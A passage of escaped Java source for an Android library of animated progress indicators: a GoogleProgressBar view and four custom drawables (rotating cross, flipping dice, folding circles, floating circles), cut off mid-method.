{\n        this(context, attrs,android.R.attr.progressBarStyle);\n    }\n    public GoogleProgressBar(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        if (isInEditMode())\n            return;\n        final int typeIndex \u003d _type;\n\t\tfinal int[] colorsId \u003d _color;\n        android.graphics.drawable.Drawable drawable \u003d buildDrawable(context,typeIndex,colorsId);\n        if(drawable!\u003dnull)\n        setIndeterminateDrawable(drawable);\n    }\n    private android.graphics.drawable.Drawable buildDrawable(Context context, int typeIndex,int[] colorsId) {\n        android.graphics.drawable.Drawable drawable \u003d null;\n        ProgressType type \u003d ProgressType.values()[typeIndex];\n        switch (type){\n            case FOLDING_CIRCLES:\n                drawable \u003d new FoldingCirclesDrawable.Builder(context).colors(colorsId).build();\n                break;\n            case GOOGLE_MUSIC_DICES:\n                drawable \u003d new GoogleMusicDicesDrawable.Builder().build();\n                break;\n            case NEXUS_ROTATION_CROSS:\n                drawable \u003d new NexusRotationCrossDrawable.Builder(context).colors(colorsId).build();\n                break;\n            case CHROME_FLOATING_CIRCLES:\n                drawable \u003d new ChromeFloatingCirclesDrawable.Builder(context).colors(colorsId).build();\n                break;\n        }\n        return drawable;\n    }\n    public static void setType(int types) {\n    \t_type \u003d types;\n    }\n    public static void setColor(int[] colors) {\n    \t_color \u003d colors;\n    }\n}\n\n\npublic static class NexusRotationCrossDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static int ANIMATION_DURATION \u003d 150;\n    private static int ANIMATION_START_DELAY \u003d 300;\n    private static final android.view.animation.Interpolator LINEAR_INTERPOLATOR \u003d new LinearInterpolator();\n    private int mCenter;\n    private Point[] mArrowPoints;\n    private Path mPath;\n    private Paint mPaint1;\n    private Paint mPaint2;\n    private Paint mPaint3;\n    private Paint mPaint4;\n    private int mRotationAngle;\n    public NexusRotationCrossDrawable(int[] colors) {\n        mArrowPoints \u003d new Point[5];\n        mPath \u003d new Path();\n        mPaint1 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint1.setColor(colors[0]);\n        mPaint2 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint2.setColor(colors[1]);\n        mPaint3 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint3.setColor(colors[2]);\n        mPaint4 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint4.setColor(colors[3]);\n        initObjectAnimator();\n    }\n    private void initObjectAnimator() {\n        final ObjectAnimator objectAnimator \u003d ObjectAnimator.ofInt(this, \"rotationAngle\", 0, 180);\n        objectAnimator.setInterpolator(LINEAR_INTERPOLATOR);\n        objectAnimator.setDuration(ANIMATION_DURATION);\n        objectAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                if (mRotationAngle \u003d\u003d 180) {\n                    objectAnimator.setIntValues(180, 360);\n                    objectAnimator.setStartDelay(ANIMATION_START_DELAY * 2);\n                } else {\n                    objectAnimator.setIntValues(0, 180);\n                    objectAnimator.setStartDelay(ANIMATION_START_DELAY);\n                    mRotationAngle \u003d 0;\n                }\n                objectAnimator.start();\n            }\n        });\n        objectAnimator.start();\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        drawArrows(canvas);\n    }\n    private void drawArrows(Canvas canvas) {\n        canvas.rotate(mRotationAngle, mCenter, mCenter);\n        mPath.reset();\n        mPath.moveTo(mArrowPoints[0].x, mArrowPoints[0].y);\n        for (int i \u003d 1; i \u003c mArrowPoints.length; i++) {\n            mPath.lineTo(mArrowPoints[i].x, mArrowPoints[i].y);\n        }\n        mPath.lineTo(mArrowPoints[0].x, mArrowPoints[0].y);\n        canvas.save();\n        canvas.drawPath(mPath, mPaint1);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(90, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint2);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(180, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint3);\n        canvas.restore();\n        canvas.save();\n        canvas.rotate(270, mCenter, mCenter);\n        canvas.drawPath(mPath, mPaint4);\n        canvas.restore();\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint1.setAlpha(alpha);\n        mPaint2.setAlpha(alpha);\n        mPaint3.setAlpha(alpha);\n        mPaint4.setAlpha(alpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mPaint1.setColorFilter(cf);\n        mPaint2.setColorFilter(cf);\n        mPaint3.setColorFilter(cf);\n        mPaint4.setColorFilter(cf);\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureDrawable(bounds);\n    }\n    private void measureDrawable(Rect bounds) {\n        mCenter \u003d bounds.centerX();\n        int arrowMargin \u003d bounds.width() / 50;\n        int arrowWidth \u003d bounds.width() / 15;\n        int padding \u003d mCenter - (int) (mCenter /  Math.sqrt(2));\n        mArrowPoints[0] \u003d new Point(mCenter - arrowMargin, mCenter - arrowMargin);\n        mArrowPoints[1] \u003d new Point(mArrowPoints[0].x, mArrowPoints[0].y - arrowWidth);\n        mArrowPoints[2] \u003d new Point(padding + arrowWidth, padding);\n        mArrowPoints[3] \u003d new Point(padding, padding + arrowWidth);\n        mArrowPoints[4] \u003d new Point(mArrowPoints[0].x - arrowWidth, mArrowPoints[0].y);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    void setRotationAngle(int angle) {\n        mRotationAngle \u003d angle;\n    }\n    int getRotationAngle() {\n        return mRotationAngle;\n    }\n    public static class Builder {\n        private int[] mColors;\n        public Builder(Context context) {\n            initDefaults(context);\n        }\n        \n        private void initDefaults(Context context) {\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n        }\n        \n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length !\u003d 4) {\n                throw new IllegalArgumentException(\"Your color array must contains 4 values\");\n            }\n            mColors \u003d colors;\n            return this;\n        }\n        public android.graphics.drawable.Drawable build() {\n            return new NexusRotationCrossDrawable(mColors);\n        }\n    }\n}\n\n\npublic static class GoogleMusicDicesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final int DICE_SIDE_COLOR \u003d Color.parseColor(\"#FFDBDBDB\");\n    private static final int DICE_SIDE_SHADOW_COLOR \u003d Color.parseColor(\"#FFB8B8B9\");\n    private static final int ANIMATION_DURATION \u003d 350;\n    private static final int ANIMATION_START_DELAY \u003d 150;\n    private static final android.view.animation.Interpolator ACCELERATE_INTERPOLATOR \u003d new AccelerateInterpolator();\n    private Paint mPaint;\n    private Paint mPaintShadow;\n    private Paint mPaintCircle;\n    private int mSize;\n    private float mScale;\n    private DiceRotation mDiceRotation;\n    private DiceState[] mDiceStates;\n    private int mDiceState;\n    private enum DiceSide {\n        ONE,\n        TWO,\n        THREE,\n        FOUR,\n        FIVE,\n        SIX\n    }\n    private enum DiceRotation {\n        LEFT,\n        DOWN;\n\n        DiceRotation invert() {\n            return this \u003d\u003d LEFT ? DOWN : LEFT;\n        }\n    }\n    private class DiceState {\n        private DiceSide side1;\n        private DiceSide side2;\n        DiceState(DiceSide side1, DiceSide side2) {\n            this.side1 \u003d side1;\n            this.side2 \u003d side2;\n        }\n    }\n    public GoogleMusicDicesDrawable() {\n        init();\n    }\n    private void init() {\n        mPaint \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint.setColor(DICE_SIDE_COLOR);\n        mPaintShadow \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaintShadow.setColor(DICE_SIDE_SHADOW_COLOR);\n        mPaintCircle \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaintCircle.setColor(Color.WHITE);\n        mDiceStates \u003d new DiceState[] {\n                new DiceState(DiceSide.ONE, DiceSide.THREE),\n                new DiceState(DiceSide.TWO, DiceSide.THREE),\n                new DiceState(DiceSide.TWO, DiceSide.SIX),\n                new DiceState(DiceSide.FOUR, DiceSide.SIX),\n                new DiceState(DiceSide.FOUR, DiceSide.FIVE),\n                new DiceState(DiceSide.ONE, DiceSide.FIVE)\n        };\n        mDiceRotation \u003d DiceRotation.LEFT;\n        initObjectAnimator();\n    }\n    private void initObjectAnimator() {\n        final ObjectAnimator objectAnimator \u003d ObjectAnimator.ofFloat(this, \"scale\", 0, 1);\n        objectAnimator.setInterpolator(ACCELERATE_INTERPOLATOR);\n        objectAnimator.setDuration(ANIMATION_DURATION);\n        objectAnimator.setStartDelay(ANIMATION_START_DELAY);\n        objectAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override\n            public void onAnimationEnd(Animator animation) {\n                mScale \u003d 0;\n                mDiceState++;\n                if (mDiceState \u003d\u003d mDiceStates.length) {\n                    mDiceState \u003d 0;\n                }\n                mDiceRotation \u003d mDiceRotation.invert();\n                objectAnimator.start();\n            }\n        });\n        objectAnimator.start();\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        if (mDiceRotation !\u003d null) {\n            switch (mDiceRotation) {\n                case DOWN:\n                    drawScaleY(canvas);\n                    break;\n                case LEFT:\n                    drawScaleX(canvas);\n                    break;\n            }\n        }\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint.setAlpha(alpha);\n        mPaintShadow.setAlpha(alpha);\n        mPaintCircle.setAlpha(alpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mPaint.setColorFilter(cf);\n        mPaintShadow.setColorFilter(cf);\n        mPaintCircle.setColorFilter(cf);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        mSize \u003d bounds.width();\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    private void drawScaleX(Canvas canvas) {\n        canvas.save();\n        Matrix matrix \u003d new Matrix();\n        matrix.preScale(1 - mScale, 1, 0, mSize / 2);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side1, mScale \u003e 0.1f);\n        canvas.restore();\n        canvas.save();\n        matrix \u003d new Matrix();\n        matrix.preScale(mScale, 1, mSize, mSize / 2);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side2, false);\n        canvas.restore();\n    }\n    private void drawScaleY(Canvas canvas) {\n        canvas.save();\n        Matrix matrix \u003d new Matrix();\n        matrix.preScale(1, mScale, mSize / 2, 0);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side1, false);\n        canvas.restore();\n        canvas.save();\n        matrix \u003d new Matrix();\n        matrix.preScale(1, 1 - mScale, mSize / 2, mSize);\n        canvas.concat(matrix);\n        drawDiceSide(canvas, mDiceStates[mDiceState].side2, mScale \u003e 0.1f);\n        canvas.restore();\n    }\n    private void drawDiceSide(Canvas canvas, DiceSide side, boolean shadow) {\n        int circleRadius \u003d mSize / 10;\n        canvas.drawRect(0, 0, mSize, mSize, shadow ? mPaintShadow : mPaint);\n        switch (side) {\n            case ONE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                break;\n            case TWO:\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case THREE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, mSize / 10, mPaintCircle);\n                break;\n            case FOUR:\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case FIVE:\n                canvas.drawCircle(mSize / 2, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                break;\n            case SIX:\n                canvas.drawCircle(mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 4, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize / 2, circleRadius, mPaintCircle);\n                canvas.drawCircle(mSize - mSize / 4, mSize - mSize / 4, circleRadius, mPaintCircle);\n                break;\n        }\n    }\n    float getScale() {\n        return mScale;\n    }\n    void setScale(float scale) {\n        this.mScale \u003d scale;\n    }\n    public static class Builder {\n        public android.graphics.drawable.Drawable build() {\n            return new GoogleMusicDicesDrawable();\n        }\n    }\n}\n\n\npublic static class FoldingCirclesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final float MAX_LEVEL \u003d 10000;\n    private static final float CIRCLE_COUNT \u003d ProgressStates.values().length;\n    private static final float MAX_LEVEL_PER_CIRCLE \u003d MAX_LEVEL / CIRCLE_COUNT;\n    private static final int ALPHA_OPAQUE \u003d 255;\n    private static final int ALPHA_ABOVE_DEFAULT \u003d 235;\n    private Paint mFstHalfPaint;\n    private Paint mScndHalfPaint;\n    private Paint mAbovePaint;\n    private RectF mOval \u003d new RectF();\n    private int mDiameter;\n    private Path mPath;\n    private int mHalf;\n    private ProgressStates mCurrentState;\n    private int mControlPointMinimum;\n    private int mControlPointMaximum;\n    private int mAxisValue;\n    private int mAlpha \u003d ALPHA_OPAQUE;\n    private ColorFilter mColorFilter;\n    private static int mColor1;\n    private static int mColor2;\n    private static int mColor3;\n    private static int mColor4;\n    private int fstColor, scndColor;\n    private boolean goesBackward;\n    private enum ProgressStates {\n        FOLDING_DOWN,\n        FOLDING_LEFT,\n        FOLDING_UP,\n        FOLDING_RIGHT\n    }\n    public FoldingCirclesDrawable(int[] colors) {\n        initCirclesProgress(colors);\n    }\n    private void initCirclesProgress(int[] colors) {\n        initColors(colors);\n        mPath \u003d new Path();\n        Paint basePaint \u003d new Paint();\n        basePaint.setAntiAlias(true);\n        mFstHalfPaint \u003d new Paint(basePaint);\n        mScndHalfPaint \u003d new Paint(basePaint);\n        mAbovePaint \u003d new Paint(basePaint);\n        setAlpha(mAlpha);\n        setColorFilter(mColorFilter);\n    }\n    private void initColors(int[] colors) {\n        mColor1\u003dcolors[0];\n        mColor2\u003dcolors[1];\n        mColor3\u003dcolors[2];\n        mColor4\u003dcolors[3];\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureCircleProgress(bounds.width(), bounds.height());\n    }\n    @Override\n    protected boolean onLevelChange(int level) {\n        int animationLevel \u003d level \u003d\u003d MAX_LEVEL ? 0 : level;\n        int stateForLevel \u003d (int) (animationLevel / MAX_LEVEL_PER_CIRCLE);\n        mCurrentState \u003d ProgressStates.values()[stateForLevel];\n        resetColor(mCurrentState);\n        int levelForCircle \u003d (int) (animationLevel % MAX_LEVEL_PER_CIRCLE);\n        boolean halfPassed;\n        if (!goesBackward) {\n            halfPassed \u003d levelForCircle !\u003d (int) (animationLevel % (MAX_LEVEL_PER_CIRCLE / 2));\n        } else {\n            halfPassed \u003d levelForCircle \u003d\u003d (int) (animationLevel % (MAX_LEVEL_PER_CIRCLE / 2));\n            levelForCircle \u003d (int) (MAX_LEVEL_PER_CIRCLE - levelForCircle);\n        }\n        mFstHalfPaint.setColor(fstColor);\n        mScndHalfPaint.setColor(scndColor);\n        if (!halfPassed) {\n            mAbovePaint.setColor(mScndHalfPaint.getColor());\n        } else {\n            mAbovePaint.setColor(mFstHalfPaint.getColor());\n        }\n        setAlpha(mAlpha);\n        mAxisValue \u003d (int) (mControlPointMinimum + (mControlPointMaximum - mControlPointMinimum) * (levelForCircle / MAX_LEVEL_PER_CIRCLE));\n        return true;\n    }\n    private void resetColor(ProgressStates currentState) {\n        switch (currentState){\n            case FOLDING_DOWN:\n                fstColor\u003d mColor1;\n                scndColor\u003dmColor2;\n                goesBackward\u003dfalse;\n            break;\n            case FOLDING_LEFT:\n                fstColor\u003d mColor1;\n                scndColor\u003dmColor3;\n                goesBackward\u003dtrue;\n                break;\n            case FOLDING_UP:\n                fstColor\u003d mColor3;\n                scndColor\u003dmColor4;\n                goesBackward\u003dtrue;\n                break;\n            case FOLDING_RIGHT:\n                fstColor\u003dmColor2;\n                scndColor\u003dmColor4;\n                goesBackward\u003dfalse;\n                break;\n        }\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        if (mCurrentState !\u003d null) {\n            makeCirclesProgress(canvas);\n        }\n    }\n    private void measureCircleProgress(int width, int height) {\n        mDiameter \u003d Math.min(width, height);\n        mHalf \u003d mDiameter / 2;\n        mOval.set(0, 0, mDiameter, mDiameter);\n        mControlPointMinimum \u003d -mDiameter / 6;\n        mControlPointMaximum \u003d mDiameter + mDiameter / 6;\n    }\n    private void makeCirclesProgress(Canvas canvas) {\n        switch (mCurrentState) {\n            case FOLDING_DOWN:\n            case FOLDING_UP:\n                drawYMotion(canvas);\n                break;\n            case FOLDING_RIGHT:\n            case FOLDING_LEFT:\n                drawXMotion(canvas);\n                break;\n        }\n        canvas.drawPath(mPath, mAbovePaint);\n    }\n    private void drawXMotion(Canvas canvas) {\n        canvas.drawArc(mOval, 90, 180, true, mFstHalfPaint);\n        canvas.drawArc(mOval, -270, -180, true, mScndHalfPaint);\n        mPath.reset();\n        mPath.moveTo(mHalf, 0);\n        mPath.cubicTo(mAxisValue, 0, mAxisValue, mDiameter, mHalf, mDiameter);\n        mPath.moveTo(mHalf+1, 0);\n        mPath.cubicTo(mAxisValue, 0, mAxisValue, mDiameter, mHalf+1, mDiameter);\n    }\n    private void drawYMotion(Canvas canvas) {\n        canvas.drawArc(mOval, 0, -180, true, mFstHalfPaint);\n        canvas.drawArc(mOval, -180, -180, true, mScndHalfPaint);\n        mPath.reset();\n        mPath.moveTo(0, mHalf);\n        mPath.cubicTo(0, mAxisValue, mDiameter, mAxisValue, mDiameter, mHalf);\n        mPath.moveTo(0, mHalf+1);\n        mPath.cubicTo(0, mAxisValue, mDiameter, mAxisValue, mDiameter, mHalf+1);\n    }\n    @Override\n    public void setAlpha(int alpha) {\n        this.mAlpha \u003d alpha;\n        mFstHalfPaint.setAlpha(alpha);\n        mScndHalfPaint.setAlpha(alpha);\n        int targetAboveAlpha \u003d (ALPHA_ABOVE_DEFAULT * alpha) / ALPHA_OPAQUE;\n        mAbovePaint.setAlpha(targetAboveAlpha);\n    }\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        this.mColorFilter \u003d cf;\n        mFstHalfPaint.setColorFilter(cf);\n        mScndHalfPaint.setColorFilter(cf);\n        mAbovePaint.setColorFilter(cf);\n    }\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n    public static class Builder {\n        private int[] mColors;\n        public Builder(Context context){\n            initDefaults(context);\n        }\n        \n        private void initDefaults(Context context) {\n            //Default values\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n        }\n        \n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length \u003d\u003d 0) {\n                throw new IllegalArgumentException(\"Your color array must contains at least 4 values\");\n            }\n            mColors \u003d colors;\n            return this;\n        }\n        public android.graphics.drawable.Drawable build() {\n            return new FoldingCirclesDrawable(mColors);\n        }\n    }\n}\n\n\npublic static class ChromeFloatingCirclesDrawable extends android.graphics.drawable.Drawable implements android.graphics.drawable.Drawable.Callback {\n    private static final int MAX_LEVEL \u003d 10000;\n    private static final int CENT_LEVEL \u003d MAX_LEVEL / 2;\n    private static final int MID_LEVEL \u003d CENT_LEVEL / 2;\n    private static final int ALPHA_OPAQUE \u003d 255;\n    private static final int ACCELERATION_LEVEL \u003d 2;\n    private int mAlpha \u003d ALPHA_OPAQUE;\n    private ColorFilter mColorFilter;\n    private Point[] mArrowPoints;\n    private Paint mPaint1;\n    private Paint mPaint2;\n    private Paint mPaint3;\n    private Paint mPaint4;\n    private double unit;\n    private int width, x_beg, y_beg, x_end, y_end, offset;\n    private int acceleration \u003d ACCELERATION_LEVEL;\n    private double distance \u003d 0.5 * ACCELERATION_LEVEL * MID_LEVEL * MID_LEVEL;\n    private double max_speed; // set in setAcceleration(...);\n    private double offsetPercentage;\n    private int colorSign;\n    private ProgressStates currentProgressStates \u003d ProgressStates.GREEN_TOP;\n    private enum ProgressStates {\n        GREEN_TOP,\n        YELLOW_TOP,\n        RED_TOP,\n        BLUE_TOP\n    }\n    public ChromeFloatingCirclesDrawable(int[] colors) {\n        initCirclesProgress(colors);\n    }\n    private void initCirclesProgress(int[] colors) {\n        initColors(colors);\n        setAlpha(mAlpha);\n        setColorFilter(mColorFilter);\n        setAcceleration(ACCELERATION_LEVEL);\n        offsetPercentage \u003d 0;\n        colorSign \u003d 1; // |\u003d 1, |\u003d 2, |\u003d 4, |\u003d 8 --\u003e 0xF\n    }\n\n    private void initColors(int[] colors) {\n        mPaint1 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint1.setColor(colors[0]);\n        mPaint1.setAntiAlias(true);\n        mPaint2 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint2.setColor(colors[1]);\n        mPaint2.setAntiAlias(true);\n        mPaint3 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint3.setColor(colors[2]);\n        mPaint3.setAntiAlias(true);\n        mPaint4 \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n        mPaint4.setColor(colors[3]);\n        mPaint4.setAntiAlias(true);\n    }\n    @Override\n    protected void onBoundsChange(Rect bounds) {\n        super.onBoundsChange(bounds);\n        measureCircleProgress(bounds.width(), bounds.height());\n    }\n    @Override\n    protected boolean onLevelChange(int level) {\n        level %\u003d MAX_LEVEL / acceleration;\n        final int temp_level \u003d level % (MID_LEVEL / acceleration);\n        final int ef_width \u003d (int)(unit * 3.0); // effective width\n        if(level \u003c CENT_LEVEL / acceleration) { // go\n            if(level \u003c MID_LEVEL / acceleration) {\n                if(colorSign \u003d\u003d 0xF) {\n                    changeTopColor();\n                    colorSign \u003d 1;\n                }\n                offsetPercentage \u003d 0.5 * acceleration * temp_level * temp_level / distance;\n                offset \u003d (int)(offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n            else {\n                colorSign |\u003d 2;\n                // from mid to end\n                offsetPercentage \u003d (max_speed * temp_level\n                        - 0.5 * acceleration * temp_level * temp_level) / distance\n                        + 1.0;\n                offset \u003d (int)(offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n        }\n        else { // back\n            if(level \u003c (CENT_LEVEL + MID_LEVEL) / acceleration) {\n                // set colorSign\n                if(colorSign \u003d\u003d 0x3) {\n                    changeTopColor();\n                    colorSign |\u003d 4;\n                }\n                // from end to mid\n                offsetPercentage \u003d 0.5 * acceleration * temp_level * temp_level  / distance;\n                offset \u003d (int)(ef_width - offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n            else {\n                // set colorSign\n                colorSign |\u003d 8;\n                // from mid to beg\n                offsetPercentage \u003d (max_speed * temp_level\n                        - 0.5 * acceleration * temp_level * temp_level) / distance\n                        + 1.0;\n                offsetPercentage \u003d offsetPercentage \u003d\u003d 1.0 ? 2.0 : offsetPercentage;\n                offset \u003d (int)(ef_width - offsetPercentage * ef_width / 2); // x and y direction offset\n            }\n        }\n\n        mArrowPoints[0].set((int)unit+x_beg+offset, (int)unit+y_beg+offset); // mPaint1, left up\n        mArrowPoints[1].set((int)(unit*4.0)+x_beg-offset, (int)(unit*4.0)+y_beg-offset); // mPaint2, right down\n        mArrowPoints[2].set((int)unit+x_beg+offset, (int)(unit*4.0)+y_beg-offset); // mPaint3, left down\n        mArrowPoints[3].set((int)(unit*4.0)+x_beg-offset, (int)unit+y_beg+offset); // mPaint4, right up\n\n        return true;\n    }\n\n    private void changeTopColor() {\n        switch(currentProgressStates){\n            case GREEN_TOP:\n                currentProgressStates \u003d ProgressStates.YELLOW_TOP;\n                break;\n            case YELLOW_TOP:\n                currentProgressStates \u003d ProgressStates.RED_TOP;\n                break;\n            case RED_TOP:\n                currentProgressStates \u003d ProgressStates.BLUE_TOP;\n                break;\n            case BLUE_TOP:\n                currentProgressStates \u003d ProgressStates.GREEN_TOP;\n                break;\n        }\n    }\n\n    @Override\n    public void draw(Canvas canvas) {\n        // draw circles\n        if(currentProgressStates !\u003d ProgressStates.RED_TOP)\n            canvas.drawCircle(mArrowPoints[0].x, mArrowPoints[0].y, (float)unit, mPaint1);\n        if(currentProgressStates !\u003d ProgressStates.BLUE_TOP)\n            canvas.drawCircle(mArrowPoints[1].x, mArrowPoints[1].y, (float)unit, mPaint2);\n        if(currentProgressStates !\u003d ProgressStates.YELLOW_TOP)\n            canvas.drawCircle(mArrowPoints[2].x, mArrowPoints[2].y, (float)unit, mPaint3);\n        if(currentProgressStates !\u003d ProgressStates.GREEN_TOP)\n            canvas.drawCircle(mArrowPoints[3].x, mArrowPoints[3].y, (float)unit, mPaint4);\n\n        // draw the top one\n        switch(currentProgressStates){\n            case GREEN_TOP:\n                canvas.drawCircle(mArrowPoints[3].x, mArrowPoints[3].y, (float)unit, mPaint4);\n                break;\n            case YELLOW_TOP:\n                canvas.drawCircle(mArrowPoints[2].x, mArrowPoints[2].y, (float)unit, mPaint3);\n                break;\n            case RED_TOP:\n                canvas.drawCircle(mArrowPoints[0].x, mArrowPoints[0].y, (float)unit, mPaint1);\n                break;\n            case BLUE_TOP:\n                canvas.drawCircle(mArrowPoints[1].x, mArrowPoints[1].y, (float)unit, mPaint2);\n                break;\n        }\n    }\n\n    private void measureCircleProgress(int width, int height) {\n        // get min edge as width\n        if(width \u003e height) {\n            // use height\n            this.width \u003d height - 1; // minus 1 to avoid \"3/2\u003d1\"\n            x_beg \u003d (width - height) / 2 + 1;\n            y_beg \u003d 1;\n            x_end \u003d x_beg + this.width;\n            y_end \u003d this.width;\n        }\n        else {\n            //use width\n            this.width \u003d width - 1;\n            x_beg \u003d 1;\n            y_beg \u003d (height - width) / 2 + 1;\n            x_end \u003d this.width;\n            y_end \u003d y_beg + this.width;\n        }\n        unit \u003d (double)this.width / 5.0;\n\n        // init the original position, and then set position by offsets\n        mArrowPoints \u003d new Point[4];\n        mArrowPoints[0] \u003d new Point((int)unit+x_beg, (int)unit+y_beg); // mPaint1, left up\n        mArrowPoints[1] \u003d new Point((int)(unit*4.0)+x_beg, (int)(unit*4.0)+y_beg); // mPaint2, right down\n        mArrowPoints[2] \u003d new Point((int)unit+x_beg, (int)(unit*4.0)+y_beg); // mPaint3, left down\n        mArrowPoints[3] \u003d new Point((int)(unit*4.0)+x_beg, (int)unit+y_beg); // mPaint4, right up\n    }\n\n    public void setAcceleration(int acceleration) {\n        this.acceleration \u003d acceleration;\n        distance \u003d 0.5 * acceleration * (MID_LEVEL / acceleration) * (MID_LEVEL / acceleration);\n        max_speed \u003d acceleration * (MID_LEVEL / acceleration);\n    }\n\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint1.setAlpha(alpha);\n        mPaint2.setAlpha(alpha);\n        mPaint3.setAlpha(alpha);\n        